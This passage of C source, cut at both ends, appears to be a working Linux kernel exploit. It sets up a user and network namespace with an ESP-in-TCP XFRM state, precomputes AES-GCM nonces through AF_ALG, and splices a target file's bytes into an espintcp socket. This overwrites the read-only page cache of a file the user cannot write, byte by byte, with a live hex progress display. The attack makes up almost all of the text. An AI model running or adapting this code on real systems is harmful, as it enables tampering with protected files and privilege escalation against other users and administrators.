static unsigned char active_esp_gcm_iv[8] = {
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
};
static uint32_t active_esp_seq = 1;
static const char *target_file;
static const char *target_path;
static bool plain_mode;         /* 不画 hex 帧，只打文本进度 */
static char target_file_buf[PATH_MAX];
static loff_t target_splice_off;

static uint16_t stream0_nonce[256];
static bool stream0_have[256];

static void die(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(2);
}

static void gate_fail(const char *what)
{
	printf("namespace_gate_failed: %s errno=%d (%s)\n",
	       what, errno, strerror(errno));
	exit(4);
}

static void store_be32(unsigned char *p, uint32_t v)
{
	p[0] = (unsigned char)(v >> 24);
	p[1] = (unsigned char)(v >> 16);
	p[2] = (unsigned char)(v >> 8);
	p[3] = (unsigned char)v;
}

/* ANSI colours */
#define C_RESET  "\033[0m"
#define C_BOLD   "\033[1m"
#define C_GREEN  "\033[32m"
#define C_YELLOW "\033[33m"
#define C_CYAN   "\033[36m"
#define C_WHITE  "\033[97m"
#define C_BRED   "\033[1;31m"
#define C_BGRN   "\033[1;32m"
#define C_BYLW   "\033[1;33m"
#define C_BCYN   "\033[1;36m"
#define C_BWHT   "\033[1;97m"

static void print_hex_bytes(const char *label, const unsigned char *buf,
			    size_t len)
{
	size_t i;

	printf(C_DIM "%s=" C_RESET C_CYAN, label);
	for (i = 0; i < len; i++)
		printf("%02x", buf[i]);
	printf(C_RESET "\n");
}

/* Dump a 16-byte aligned row centred on `highlight_off`, marking that byte. */
__attribute__((unused))
static void print_hex_row(const char *path, uint64_t highlight_off,
			  const char *before_label, unsigned char before_val,
			  const char *after_label,  unsigned char after_val)
{
	uint64_t row_start = highlight_off & ~(uint64_t)15;
	unsigned char row[16];
	ssize_t got;
	size_t col;
	int fd;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	got = pread(fd, row, sizeof(row), (off_t)row_start);
	close(fd);
	if (got <= 0)
		return;

	/* Hex section */
	printf(C_DIM "  %016llx  " C_RESET, (unsigned long long)row_start);
	for (col = 0; col < 16; col++) {
		if (col == 8)
			printf(" ");
		if ((size_t)got > col) {
			if (row_start + col == highlight_off)
				printf(C_BRED "[%02x]" C_RESET, row[col]);
			else
				printf(C_DIM "%02x " C_RESET, row[col]);
		} else {
			printf(C_DIM "   " C_RESET);
		}
	}

	/* ASCII section */
	printf("  " C_DIM "|" C_RESET);
	for (col = 0; col < (size_t)got; col++) {
		unsigned char c = row[col];
		if (row_start + col == highlight_off)
			printf(C_BRED "%c" C_RESET,
			       (c >= 0x20 && c < 0x7f) ? c : '.');
		else
			printf(C_DIM "%c" C_RESET,
			       (c >= 0x20 && c < 0x7f) ? c : '.');
	}
	printf(C_DIM "|" C_RESET "\n");

	/* Annotation line */
	size_t col_off = (size_t)(highlight_off - row_start);
	size_t arrow_pos = 20 + col_off * 3 + (col_off >= 8 ? 1 : 0) + 1;
	printf("%*s" C_BYLW "^-- +%04llx  "
	       C_RED "%s" C_RESET ":" C_BRED "%02x" C_RESET
	       "  ->  "
	       C_GREEN "%s" C_RESET ":" C_BGRN "%02x" C_RESET "\n",
	       (int)arrow_pos, "",
	       (unsigned long long)(highlight_off & 0xffff),
	       before_label, before_val,
	       after_label, after_val);
}

static int open_afalg_aes_ecb(void)
{
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
	};
	int fd;

	fd = socket(AF_ALG, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("socket(AF_ALG)");

	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "ecb(aes)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind AF_ALG ecb(aes)");
	if (setsockopt(fd, SOL_ALG, ALG_SET_KEY, xfrm_aead_key, 16) < 0)
		die("setsockopt AF_ALG key");

	return fd;
}

static void afalg_aes_encrypt_block(int alg_fd, const unsigned char in[16],
				    unsigned char out[16])
{
	char cbuf[CMSG_SPACE(sizeof(uint32_t))] = {};
	struct iovec iov = {
		.iov_base = (void *)in,
		.iov_len = 16,
	};
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = cbuf,
		.msg_controllen = sizeof(cbuf),
	};
	struct cmsghdr *cmsg;
	uint32_t op = ALG_OP_ENCRYPT;
	ssize_t ret;
	int op_fd;

	op_fd = accept4(alg_fd, NULL, NULL, SOCK_CLOEXEC);
	if (op_fd < 0)
		die("accept AF_ALG");

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_OP;
	cmsg->cmsg_len = CMSG_LEN(sizeof(op));
	memcpy(CMSG_DATA(cmsg), &op, sizeof(op));

	ret = sendmsg(op_fd, &msg, 0);
	if (ret != 16)
		die("sendmsg AF_ALG block");
	ret = read(op_fd, out, 16);
	if (ret != 16)
		die("read AF_ALG block");

	close(op_fd);
}

static unsigned char aes_gcm_stream0_byte(int alg_fd,
					  const unsigned char iv[8])
{
	unsigned char counter_block[16], stream[16];

	memcpy(counter_block, &xfrm_aead_key[16], 4);
	memcpy(counter_block + 4, iv, 8);
	store_be32(counter_block + 12, 2);
	afalg_aes_encrypt_block(alg_fd, counter_block, stream);
	return stream[0];
}

static void build_stream0_table(void)
{
	unsigned char iv[8] = {
		0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
	};
	unsigned int count = 0, nonce;
	int alg_fd;

	alg_fd = open_afalg_aes_ecb();
	for (nonce = 0; nonce <= 0xffff && count < 256; nonce++) {
		unsigned char b;

		store_be32(iv + 4, nonce);
		b = aes_gcm_stream0_byte(alg_fd, iv);
		if (stream0_have[b])
			continue;
		stream0_have[b] = true;
		stream0_nonce[b] = (uint16_t)nonce;
		count++;
	}
	close(alg_fd);

	if (count != 256) {
		fprintf(stderr, "failed to build complete stream-byte table: %u/256\n",
			count);
		exit(2);
	}
	printf("stream0_table_entries=256\n");
}

static void choose_iv_for_stream0(unsigned char need_stream)
{
	uint16_t nonce = stream0_nonce[need_stream];

	memset(active_esp_gcm_iv, 0xcc, sizeof(active_esp_gcm_iv));
	store_be32(active_esp_gcm_iv + 4, nonce);
	printf("byte_flip_nonce=%u stream_byte=%02x\n", nonce, need_stream);
	print_hex_bytes("byte_flip_packet_iv", active_esp_gcm_iv,
			sizeof(active_esp_gcm_iv));
}

static uint64_t parse_u64_arg(const char *s, const char *name)
{
	char *end = NULL;
	unsigned long long v;

	if (s[0] == '-') {
		fprintf(stderr, "invalid %s: %s\n", name, s);
		exit(2);
	}
	errno = 0;
	v = strtoull(s, &end, 0);
	if (errno || !end || *end != '\0') {
		fprintf(stderr, "invalid %s: %s\n", name, s);
		exit(2);
	}
	return (uint64_t)v;
}

static int hex_nibble(int c)
{
	if (c >= '0' && c <= '9')
		return c - '0';
	if (c >= 'a' && c <= 'f')
		return 10 + c - 'a';
	if (c >= 'A' && c <= 'F')
		return 10 + c - 'A';
	return -1;
}

static bool is_hex_separator(int c)
{
	return c == ':' || c == ',' || c == '-' || c == '_' ||
	       c == ' ' || c == '\t' || c == '\n' || c == '\r';
}

static unsigned char *parse_hex_bytes_arg(const char *s, size_t *len_out)
{
	size_t cap = strlen(s) / 2 + 1, len = 0;
	unsigned char *buf;
	int hi = -1, v;

	buf = malloc(cap);
	if (!buf)
		die("malloc desired bytes");

	for (; *s; s++) {
		if (is_hex_separator((unsigned char)*s))
			continue;
		if (hi < 0 && s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) {
			s++;
			continue;
		}

		v = hex_nibble((unsigned char)*s);
		if (v < 0) {
			fprintf(stderr, "invalid hex byte string near '%c'\n", *s);
			exit(2);
		}
		if (hi < 0) {
			hi = v;
			continue;
		}
		buf[len++] = (unsigned char)((hi << 4) | v);
		hi = -1;
	}

	if (hi >= 0) {
		fprintf(stderr, "hex byte string has an odd number of nibbles\n");
		exit(2);
	}
	if (len == 0) {
		fprintf(stderr, "hex byte string is empty\n");
		exit(2);
	}

	*len_out = len;
	return buf;
}

static unsigned char read_byte_at(const char *path, uint64_t off)
{
	unsigned char b;
	ssize_t ret;
	int fd;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open read byte");
	ret = pread(fd, &b, 1, (off_t)off);
	if (ret < 0)
		die("pread byte");
	if (ret != 1) {
		fprintf(stderr, "short pread at offset=%llu\n",
			(unsigned long long)off);
		exit(2);
	}
	close(fd);
	return b;
}


static uint64_t use_existing_target(const char *path)
{
	struct stat lst, st;

	if (lstat(path, &lst) < 0)
		die("lstat target");
	if (!S_ISREG(lst.st_mode)) {
		fprintf(stderr, "target is not a regular file\n");
		exit(2);
	}
	if (stat(path, &st) < 0)
		die("stat target");
	if (!S_ISREG(st.st_mode)) {
		fprintf(stderr, "target is not a regular file\n");
		exit(2);
	}
	if (st.st_size < FRAG_LEN) {
		fprintf(stderr, "target is too small: size=%lld need>=%d\n",
			(long long)st.st_size, FRAG_LEN);
		exit(2);
	}
	if (snprintf(target_file_buf, sizeof(target_file_buf), "%s", path) >=
	    (int)sizeof(target_file_buf)) {
		fprintf(stderr, "target path is too long\n");
		exit(2);
	}

	target_file = target_file_buf;
	return (uint64_t)st.st_size;
}

static void verify_write_denied(const char *label)
{
	int fd;

	errno = 0;
	fd = open(target_file, O_WRONLY | O_CLOEXEC);
	if (fd >= 0) {
		close(fd);
		printf("namespace_gate_failed: %s write-open unexpectedly succeeded\n",
		       label);
		exit(4);
	}

	printf("%s_write_open_denied=1 errno=%d (%s)\n",
	       label, errno, strerror(errno));
}

static int write_all_file_status(const char *path, const char *buf)
{
	size_t len = strlen(buf);
	int fd, saved_errno;

	fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	if (write(fd, buf, len) != (ssize_t)len) {
		saved_errno = errno;
		close(fd);
		errno = saved_errno;
		return -1;
	}
	close(fd);
	return 0;
}

static void sync_write_byte(int fd)
{
	char c = 'M';

	if (write(fd, &c, 1) != 1)
		die("sync write");
	close(fd);
}

static void sync_read_byte(int fd)
{
	char c;

	if (read(fd, &c, 1) != 1)
		die("sync read");
	close(fd);
}

static void parent_map_write_or_exit(pid_t child, const char *name,
				     const char *data)
{
	char path[128];

	snprintf(path, sizeof(path), "/proc/%ld/%s", (long)child, name);
	if (write_all_file_status(path, data) < 0) {
		printf("namespace_gate_failed: %s errno=%d (%s)\n",
		       path, errno, strerror(errno));
		kill(child, SIGKILL);
		waitpid(child, NULL, 0);
		exit(4);
	}
}

static void enter_mapped_userns(void)
{
	uid_t outer_uid = getuid();
	gid_t outer_gid = getgid();
	int ready_pipe[2], mapped_pipe[2], status;
	char map[128];
	pid_t child;

	if (pipe(ready_pipe) < 0)
		die("pipe ready");
	if (pipe(mapped_pipe) < 0)
		die("pipe mapped");

	child = fork();
	if (child < 0)
		die("fork userns mapper");

	if (child > 0) {
		close(ready_pipe[1]);
		close(mapped_pipe[0]);

		sync_read_byte(ready_pipe[0]);

		snprintf(map, sizeof(map), "0 %u 1\n", outer_uid);
		parent_map_write_or_exit(child, "uid_map", map);
		parent_map_write_or_exit(child, "setgroups", "deny\n");
		snprintf(map, sizeof(map), "0 %u 1\n", outer_gid);
		parent_map_write_or_exit(child, "gid_map", map);

		sync_write_byte(mapped_pipe[1]);

		if (waitpid(child, &status, 0) < 0)
			die("wait userns child");
		if (WIFEXITED(status))
			exit(WEXITSTATUS(status));
		if (WIFSIGNALED(status)) {
			fprintf(stderr, "userns child killed by signal %d\n",
				WTERMSIG(status));
			exit(2);
		}
		exit(2);
	}

	close(ready_pipe[0]);
	close(mapped_pipe[1]);

	if (unshare(CLONE_NEWUSER) < 0)
		gate_fail("unshare(CLONE_NEWUSER)");

	sync_write_byte(ready_pipe[1]);
	sync_read_byte(mapped_pipe[0]);

	if (setresgid(0, 0, 0) < 0)
		gate_fail("setresgid 0 in userns");
	if (setresuid(0, 0, 0) < 0)
		gate_fail("setresuid 0 in userns");

	printf("userns_setup: outer_uid=%u outer_gid=%u ns_uid=%d ns_gid=%d\n",
	       outer_uid, outer_gid, getuid(), getgid());
}

static void bring_loopback_up(void)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		gate_fail("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
		gate_fail("SIOCGIFFLAGS lo");
	ifr.ifr_flags |= IFF_UP;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		gate_fail("SIOCSIFFLAGS lo up");
	close(fd);

	printf("loopback_up=1\n");
}

static void add_nlattr(struct nlmsghdr *nlh, size_t maxlen,
		       unsigned short type, const void *data, size_t len)
{
	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
	struct nlattr *nla;

	if (off + NLA_HDRLEN + len > maxlen) {
		fprintf(stderr, "netlink message too small\n");
		exit(2);
	}

	nla = (struct nlattr *)((char *)nlh + off);
	nla->nla_type = type;
	nla->nla_len = NLA_HDRLEN + len;
	memcpy((char *)nla + NLA_HDRLEN, data, len);
	nlh->nlmsg_len = off + NLA_ALIGN(nla->nla_len);
}

static int nl_ack_errno(char *buf, ssize_t len)
{
	struct nlmsghdr *nlh;
	struct nlmsgerr *err;

	for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
	     nlh = NLMSG_NEXT(nlh, len)) {
		if (nlh->nlmsg_type != NLMSG_ERROR)
			continue;
		err = (struct nlmsgerr *)NLMSG_DATA(nlh);
		if (err->error == 0)
			return 0;
		errno = -err->error;
		return -1;
	}

	errno = EPROTO;
	return -1;
}

static void add_xfrm_espintcp_state(void)
{
	char reqbuf[4096], resp[4096];
	char aeadbuf[sizeof(struct xfrm_algo_aead) + sizeof(xfrm_aead_key)];
	struct sockaddr_nl sa = {
		.nl_family = AF_NETLINK,
	};
	struct xfrm_usersa_info *xs;
	struct xfrm_algo_aead *aead;
	struct xfrm_encap_tmpl encap;
	struct nlmsghdr *nlh;
	ssize_t ret;
	int fd;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh = (struct nlmsghdr *)reqbuf;
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*xs));
	nlh->nlmsg_type = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq = 1;

	xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	if (inet_pton(AF_INET6, "::1", &xs->saddr.in6) != 1)
		die("inet_pton saddr");
	if (inet_pton(AF_INET6, "::1", &xs->id.daddr.in6) != 1)
		die("inet_pton daddr");
	xs->id.spi = htonl(0x100);
	xs->id.proto = IPPROTO_ESP;
	xs->family = AF_INET6;
	xs->mode = XFRM_MODE_TRANSPORT;
	xs->reqid = 1;
	xs->lft.soft_byte_limit = XFRM_INF;
	xs->lft.hard_byte_limit = XFRM_INF;
	xs->lft.soft_packet_limit = XFRM_INF;
	xs->lft.hard_packet_limit = XFRM_INF;

	memset(aeadbuf, 0, sizeof(aeadbuf));
	aead = (struct xfrm_algo_aead *)aeadbuf;
	snprintf(aead->alg_name, sizeof(aead->alg_name), "rfc4106(gcm(aes))");
	aead->alg_key_len = sizeof(xfrm_aead_key) * 8;
	aead->alg_icv_len = 128;
	memcpy(aead->alg_key, xfrm_aead_key, sizeof(xfrm_aead_key));
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ALG_AEAD, aeadbuf, sizeof(aeadbuf));

	memset(&encap, 0, sizeof(encap));
	encap.encap_type = TCP_ENCAP_ESPINTCP;
	encap.encap_sport = htons(TCP_PORT);
	encap.encap_dport = htons(TCP_PORT);
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ENCAP, &encap, sizeof(encap));

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
	if (fd < 0)
		gate_fail("socket(NETLINK_XFRM)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		gate_fail("bind(NETLINK_XFRM)");

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	ret = sendto(fd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa,
		     sizeof(sa));
	if (ret < 0)
		gate_fail("sendto XFRM_MSG_NEWSA");
	if (ret != (ssize_t)nlh->nlmsg_len) {
		errno = EIO;
		gate_fail("short sendto XFRM_MSG_NEWSA");
	}

	ret = recv(fd, resp, sizeof(resp), 0);
	if (ret < 0)
		gate_fail("recv XFRM ack");
	if (nl_ack_errno(resp, ret) < 0)
		gate_fail("XFRM_MSG_NEWSA ack");
	close(fd);

	printf("xfrm_espintcp_state_add=1\n");
}

static void setup_user_netns_xfrm(void)
{
	if (prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) < 0)
		die("prctl PR_SET_DUMPABLE");
	enter_mapped_userns();

	if (unshare(CLONE_NEWNET) < 0)
		gate_fail("unshare(CLONE_NEWNET)");

	printf("netns_setup=1\n");
	bring_loopback_up();
	add_xfrm_espintcp_state();
	printf("namespace_setup_complete=1\n");
}

static void write_ready(int fd)
{
	char c = 'R';

	if (write(fd, &c, 1) != 1)
		die("ready write");
	close(fd);
}

static void wait_ready(int fd)
{
	char c;

	if (read(fd, &c, 1) != 1)
		die("ready read");
	close(fd);
}

static void receiver(int ready_write_fd)
{
	struct sockaddr_in6 addr = {
		.sin6_family = AF_INET6,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
		.sin6_port = htons(TCP_PORT),
		.sin6_flowinfo = 0,
		.sin6_scope_id = 0,
	};
	char ulp[] = "espintcp";
	int fd, cfd, one = 1;

	fd = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("receiver socket");
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		die("receiver reuseaddr");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("receiver bind");
	if (listen(fd, 1) < 0)
		die("receiver listen");

	write_ready(ready_write_fd);

	cfd = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
	if (cfd < 0)
		die("receiver accept");

	usleep(RECEIVER_PRE_ULP_US);
	if (setsockopt(cfd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp)) < 0)
		die("receiver TCP_ULP espintcp");

	printf("receiver_ns_uid=%d euid=%d espintcp_enabled_after_queue=1\n",
	       getuid(), geteuid());
	usleep(RECEIVER_POST_ULP_US);
	close(cfd);
	close(fd);
	_exit(0);
}

static void sender(int ready_read_fd)
{
	struct sockaddr_in6 dst = {
		.sin6_family = AF_INET6,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
		.sin6_port = htons(TCP_PORT),
		.sin6_flowinfo = 0,
		.sin6_scope_id = 0,
	};
	struct {
		__be16 len;
		unsigned char esp[16];
	} prefix;
	loff_t off, start_off;
	int fd, sock, p[2], one = 1;
	ssize_t ret, sent;

	wait_ready(ready_read_fd);

	memset(&prefix, 0xcc, sizeof(prefix));
	prefix.len = htons(sizeof(prefix) + FRAG_LEN);
	prefix.esp[0] = 0x00;
	prefix.esp[1] = 0x00;
	prefix.esp[2] = 0x01;
	prefix.esp[3] = 0x00;
	store_be32(&prefix.esp[4], active_esp_seq);
	memcpy(&prefix.esp[8], active_esp_gcm_iv, sizeof(active_esp_gcm_iv));

	fd = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("sender open target");
	sock = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (sock < 0)
		die("sender socket");
	if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0)
		die("sender TCP_NODELAY");
	if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		die("sender connect");

	sent = send(sock, &prefix, sizeof(prefix), 0);
	if (sent != (ssize_t)sizeof(prefix))
		die("sender send prefix");

	usleep(SENDER_PRE_SPLICE_US);

	if (pipe(p) < 0)
		die("sender pipe");
	off = target_splice_off;
	start_off = off;
	ret = splice(fd, &off, p[1], NULL, FRAG_LEN, 0);
	if (ret != FRAG_LEN)
		die("sender splice file to pipe");

	ret = splice(p[0], NULL, sock, NULL, FRAG_LEN, 0);
	if (ret < 0)
		die("sender splice pipe to tcp");

	printf("sender_ns_uid=%d euid=%d prefix_send=%zd splice_to_tcp=%zd file_off=%lld file_off_next=%lld\n",
	       getuid(), geteuid(), sent, ret, (long long)start_off,
	       (long long)off);

	close(p[0]);
	close(p[1]);
	close(sock);
	close(fd);
	_exit(ret == FRAG_LEN ? 0 : 3);
}

static int run_trigger_pair(void)
{
	int pipefd[2], st_rx, st_tx;
	pid_t rx, tx;

	if (pipe(pipefd) < 0)
		die("pipe");

	rx = fork();
	if (rx < 0)
		die("fork receiver");
	if (rx == 0) {
		close(pipefd[0]);
		receiver(pipefd[1]);
	}

	tx = fork();
	if (tx < 0)
		die("fork sender");
	if (tx == 0) {
		close(pipefd[1]);
		sender(pipefd[0]);
	}

	close(pipefd[0]);
	close(pipefd[1]);
	if (waitpid(tx, &st_tx, 0) < 0)
		die("wait sender");
	if (waitpid(rx, &st_rx, 0) < 0)
		die("wait receiver");

	printf("sender_status=%d receiver_status=%d\n", st_tx, st_rx);
	if (!WIFEXITED(st_tx) || WEXITSTATUS(st_tx) != 0 ||
	    !WIFEXITED(st_rx) || WEXITSTATUS(st_rx) != 0)
		return -1;
	return 0;
}

static uint64_t checked_byte_range_last(uint64_t byte_off, size_t byte_len)
{
	uint64_t n = (uint64_t)byte_len;

	if (n == 0) {
		fprintf(stderr, "byte range is empty\n");
		exit(2);
	}
	if (n - 1 > UINT64_MAX - byte_off) {
		fprintf(stderr, "byte range overflows uint64_t\n");
		exit(2);
	}
	return byte_off + n - 1;
}

static void draw_smash_frame(const unsigned char *desired, size_t desired_len,
			     const unsigned char *live, size_t idx_current,
			     size_t changed, size_t skipped, int first_draw)
{
	size_t done   = changed + skipped;
	size_t filled = desired_len ? done * FRAME_BAR_W / desired_len : FRAME_BAR_W;
	size_t row, col, bi, i;

	/* Save cursor, jump to row 1, buffer the whole frame into one write. */
	static char frame_buf[8192];
	setvbuf(stdout, frame_buf, _IOFBF, sizeof(frame_buf));
	if (!first_draw)
		printf("\033[s\033[?25l\033[1;1H");

	/* ── header ─────────────────────────────────────────────────── */
	printf("\r\033[2K" C_BCYN "[*]" C_RESET
	       " smashing %zu bytes into read-only page cache"
	       "  changed=" C_BGRN "%zu" C_RESET
	       "  skipped=" C_DIM "%zu" C_RESET
	       "  remaining=" C_BYLW "%zu" C_RESET "\n",
	       desired_len, changed, skipped,
	       done < desired_len ? desired_len - done : (size_t)0);

	/* ── hex dump ────────────────────────────────────────────────── */
	for (row = 0; row < FRAME_PAYLOAD_ROWS; row++) {
		/* col-0 highlight borrows the header's last trailing space */
		int col0_hi = (idx_current < desired_len &&
			       row * 16 == idx_current);
		printf("\r\033[2K" C_DIM "  %04zx%s" C_RESET,
		       row * 16, col0_hi ? " " : "  ");

		for (col = 0; col < 16; col++) {
			bi = row * 16 + col;
			int cur = (idx_current < desired_len && bi == idx_current);

			if (col == 8) {
				/* mid-gap space becomes '[' when col 8 is current */
				printf(cur ? "[" : " ");
				if (cur) {
					printf(C_BYLW "%02x]" C_RESET, live[bi]);
					continue;
				}
			}

			if (bi >= desired_len) { printf("   "); continue; }

			if (bi < idx_current) {
				printf(live[bi] == desired[bi]
				       ? C_BGRN "%02x " C_RESET
				       : C_BRED "%02x " C_RESET, live[bi]);
			} else if (cur) {
				/* col 0: '[' was the header's borrowed space
				 * col 1-7, 9-15: '\b' eats the preceding byte's space */
				printf(col == 0
				       ? C_BYLW "[%02x]" C_RESET
				       : "\b" C_BYLW "[%02x]" C_RESET, live[bi]);
			} else {
				printf(C_DIM "%02x " C_RESET, desired[bi]);
			}
		}
		printf("\n");
	}

	/* ── progress bar ────────────────────────────────────────────── */
	printf("\r\033[2K  [" C_BGRN);
	for (i = 0; i < filled; i++)          printf("=");
	printf(C_RESET C_DIM);
	for (i = filled; i < FRAME_BAR_W; i++) printf("-");
	printf(C_RESET "] " C_BWHT "%zu" C_RESET "/" C_DIM "%zu" C_RESET " (%zu%%)\n",
	       done, desired_len,
	       desired_len ? done * 100 / desired_len : (size_t)100);

	/* ── separator ───────────────────────────────────────────────── */
	printf("\r\033[2K" C_DIM
	       "────────────────────────────────────────────────────────────"
	       C_RESET "\n");

	fflush(stdout);
	setvbuf(stdout, NULL, _IONBF, 0);
	if (!first_draw)
		printf("\033[?25h\033[u");  /* restore cursor to log area */
}

static int replace_existing_bytes_after(uint64_t byte_off,
					const unsigned char *desired,
					size_t desired_len,
					uint64_t file_size)
{
	uint64_t last = checked_byte_range_last(byte_off, desired_len);
	size_t idx, changed = 0, skipped = 0;
	unsigned char live_state[PAYLOAD_LEN];
	int fd_init;

	if (last >= file_size) {
		fprintf(stderr, "byte range outside target: offset=%llu len=%zu size=%llu\n",
			(unsigned long long)byte_off, desired_len,
			(unsigned long long)file_size);
		return 2;
	}
	if (last > file_size - FRAG_LEN) {
		fprintf(stderr,
			"collateral-after mode requires requested range end <= size-%d: offset=%llu len=%zu size=%llu\n",
			FRAG_LEN, (unsigned long long)byte_off, desired_len,
			(unsigned long long)file_size);
		return 2;
	}

	printf(C_BCYN "\n[*]" C_RESET
	       " timing: rx_pre_ulp=%uus tx_pre_splice=%uus rx_post_ulp=%uus\n",
	       RECEIVER_PRE_ULP_US, SENDER_PRE_SPLICE_US, RECEIVER_POST_ULP_US);
	printf(C_BCYN "[*]" C_RESET
	       " range: offset=0x%llx len=%zu last=0x%llx"
	       " enc_len=%d splice_len=%d\n",
	       (unsigned long long)byte_off, desired_len,
	       (unsigned long long)last, ESP_GCM_ENCRYPTED_LEN, FRAG_LEN);
	printf(C_BCYN "[*]" C_RESET
	       " union: transformed=0x%llx-0x%llx"
	       " collateral_after=0x%llx-0x%llx\n",
	       (unsigned long long)byte_off,
	       (unsigned long long)(last + ESP_GCM_ENCRYPTED_LEN - 1),
	       (unsigned long long)(last + 1),
	       (unsigned long long)(last + ESP_GCM_ENCRYPTED_LEN - 1));
	printf(C_BCYN "[*]" C_RESET " ");
	print_hex_bytes("payload", desired, desired_len);
	printf("\n");

	build_stream0_table();
	printf("\n");

	/* seed live_state from the file so the hex dump has real values */
	fd_init = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd_init < 0) die("open live_state init");
	if (pread(fd_init, live_state, desired_len, (off_t)byte_off) < (ssize_t)desired_len)
		die("pread live_state init");
	close(fd_init);

	if (!plain_mode) {
		/* clear screen so the frame starts at a known row 1 */
		printf("\033[2J\033[H");
		draw_smash_frame(desired, desired_len, live_state, 0, 0, 0, 1);

		/* pin the frame to rows 1-FRAME_LINES; scroll region below */
		struct winsize ws;
		int tr = 40;
		if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws) == 0 && ws.ws_row > FRAME_LINES)
			tr = (int)ws.ws_row;
		printf("\033[%d;%dr", FRAME_LINES + 1, tr);
		printf("\033[%d;1H", tr);  /* park cursor at bottom of scroll region */
		fflush(stdout);
	}

	for (idx = 0; idx < desired_len; idx++) {
		uint64_t off = byte_off + idx;
		unsigned char current, final, need_stream;

		live_state[idx] = read_byte_at(target_file, off);
		current = live_state[idx];

		if (!plain_mode)
			draw_smash_frame(desired, desired_len, live_state, idx,
					 changed, skipped, 0);

		if (current == desired[idx]) {
			printf(C_DIM "[-] [%zu/%zu] +%04llx already=%02x skip\n" C_RESET,
			       idx + 1, desired_len, (unsigned long long)off, current);
			skipped++;
			continue;
		}

		target_splice_off = (loff_t)off;
		need_stream = current ^ desired[idx];
		choose_iv_for_stream0(need_stream);
		active_esp_seq++;

		printf(C_BCYN "[*]" C_RESET " [%zu/%zu]"
		       " +%04llx  " C_RED "%02x" C_RESET " -> " C_BGRN "%02x" C_RESET
		       "  xor=" C_CYAN "%02x" C_RESET
		       " seq=" C_DIM "%u" C_RESET
		       " nonce=" C_DIM "%u" C_RESET "\n",
		       idx + 1, desired_len, (unsigned long long)off,
		       current, desired[idx], need_stream,
		       active_esp_seq, stream0_nonce[need_stream]);

/*
		printf(C_BCYN "[*]" C_RESET " before:\n");
		print_hex_row(target_file, off, "orig", current, "want", desired[idx]);

		printf(C_BCYN "[*]" C_RESET " iv=" C_CYAN);
		{
			size_t k;
			for (k = 0; k < sizeof(active_esp_gcm_iv); k++)
				printf("%02x", active_esp_gcm_iv[k]);
		}
*/
		printf(C_RESET " firing espintcp splice...\n");

		if (run_trigger_pair() < 0) {
			fprintf(stderr, C_BRED "[-] trigger pair failed at index=%zu\n" C_RESET, idx);
			return 2;
		}

		final = read_byte_at(target_file, off);
		live_state[idx] = final;

/*
		printf(C_BCYN "[*]" C_RESET " after:\n");
		print_hex_row(target_file, off, "was", current, "now", final);
*/
		if (final == desired[idx]) {
			printf(C_BGRN "[+]" C_RESET " smashed"
			       C_DIM " %02x -> %02x  index=%zu offset=+%04llx\n\n" C_RESET,
			       current, final, idx, (unsigned long long)off);
			changed++;
			continue;
		}
		if (final == current) {
			printf(C_BGRN "[-]" C_RESET
			       " fixed behavior: byte unchanged at index=%zu offset=%llu\n",
			       idx, (unsigned long long)off);
			return 0;
		}
		printf(C_BRED "[-]" C_RESET
		       " BUG: byte changed but desired-value check mismatched"
